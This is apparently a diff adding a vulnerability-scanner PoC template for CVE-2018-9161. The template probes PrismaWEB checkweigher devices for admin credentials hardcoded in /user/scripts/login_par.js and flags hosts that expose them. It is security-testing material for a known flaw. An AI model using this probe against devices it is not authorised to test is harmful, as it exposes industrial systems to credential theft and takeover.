@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "Prisma Industriale Checkweigher PrismaWEB 1.21 存在硬编码凭证泄露漏洞，通过访问 /user/scripts/login_par.js 可获取管理员账号密码，攻击者可利用该凭据直接登录后台获取系统控制权。"
+id = "POC-AVE-2018-0219"
+name = "PrismaWEB 硬编码凭证泄露 PoC"
+severity = "critical"
+tags = [
+    "cve-2018-9161",
+    "prismaweb",
+    "credentials-disclosure",
+]
+vuln_id = [
+    "CVE-2018-9161",
+    "AVE-2018-0219",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/user/scripts/login_par.js"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+condition = "and"
+expect = true
+part = "body"
+type = "word"
+words = [
+    "txtChkUser",
+    "txtChkPassword",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
